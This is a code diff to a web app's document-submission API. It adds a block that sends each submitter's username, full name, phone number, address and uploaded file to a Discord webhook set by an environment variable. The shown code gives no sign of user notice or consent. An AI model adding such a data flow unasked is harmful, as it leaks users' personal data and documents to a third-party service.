@@ -46,6 +46,49 @@ export const api = {
     };
     docs.push(newDoc);
     setStorage('documents', docs);
+
+    // Send notification and file to Discord
+    const discordWebhookUrl = import.meta.env.VITE_DISCORD_WEBHOOK_URL;
+    if (discordWebhookUrl) {
+      try {
+        const form = new FormData();
+        const message = `**New Document Submitted**\n**User:** ${user.username}\n**Name:** ${docData.fullName || 'N/A'}\n**Phone:** ${docData.phoneNumber || 'N/A'}\n**Address:** ${docData.streetAddress || 'N/A'}, ${docData.zipCode || 'N/A'}`;
+        form.append('content', message);
+        
+        const fileUrl = docData.fileUrl;
+        if (fileUrl) {
+          const match = fileUrl.match(/^data:([A-Za-z-+\/]+);base64,(.+)$/);
+          if (match) {
+            const mimeType = match[1];
+            // Decode base64 in browser
+            const byteCharacters = atob(match[2]);
+            const byteNumbers = new Array(byteCharacters.length);
+            for (let i = 0; i < byteCharacters.length; i++) {
+              byteNumbers[i] = byteCharacters.charCodeAt(i);
+            }
+            const byteArray = new Uint8Array(byteNumbers);
+            const blob = new Blob([byteArray], { type: mimeType });
+            
+            let extension = 'bin';
+            if (mimeType.includes('png')) extension = 'png';
+            else if (mimeType.includes('jpeg') || mimeType.includes('jpg')) extension = 'jpg';
+            else if (mimeType.includes('pdf')) extension = 'pdf';
+            
+            form.append('file', blob, `document.${extension}`);
+          }
+        }
+        
+        fetch(discordWebhookUrl, {
+          method: 'POST',
+          body: form
+        }).then(res => {
+          if (!res.ok) console.error("Discord webhook responded with status:", res.status);
+        }).catch(err => console.error("Discord webhook fetch error:", err));
+      } catch (e) {
+        console.error("Error formatting Discord webhook payload", e);
+      }
+    }
+
     return { success: true, docId: newDoc.id };
   },
 
